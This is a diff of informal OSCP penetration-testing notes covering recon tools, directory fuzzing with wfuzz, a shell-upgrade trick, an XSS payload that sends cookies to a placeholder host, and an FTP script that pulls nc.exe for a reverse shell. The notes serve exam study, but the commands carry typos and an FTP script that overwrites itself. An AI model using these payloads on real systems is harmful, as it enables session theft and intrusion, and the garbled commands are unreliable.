@@ -1,7 +1,24 @@
 # OSCP NOTES
 
 ● <script>new image().src="http://ip:port/bogus.php?output="+escape(document.cookie);</script>
-- netstat -ntl >> list open port
-wappalyzer >> webpage programming lange ,service{apache,lls}, OS
-<dirb> <gobaster> :: fuzzing directuries >> wfuzz 
-  wfuzz -c -z file,wordlist directiry --hc 404,302,301 url/fuzz.(php,txt,zip,sh........)
+● netstat -ntl >> list open port
+● wappalyzer >> webpage programming lange ,service{apache,lls}, OS
+● <dirb> <gobaster> :: fuzzing directuries >> wfuzz 
+   wfuzz -c -z file,wordlist directiry --hc 404,302,301 url/fuzz.(php,txt,zip,sh........)
+
+○ python -c 'import pty; pty.spawn("/bin/bash")'
+   Ctrl +z 》 process to background 
+   Stay raw -echo
+   fg
+   By this way you take interactive shell
+
+○ reverse shell by FTB
+    echo open ip >ftp.txt
+    echo user limbo >ftp.txt
+    echo pass >ftp.txt
+    echo bin >ftp.txt
+    echo GET nc.exe> ftp.txt
+    echo bye>ftp.txt
+ Ftp -v -n -s:ftp.txt
+
+○
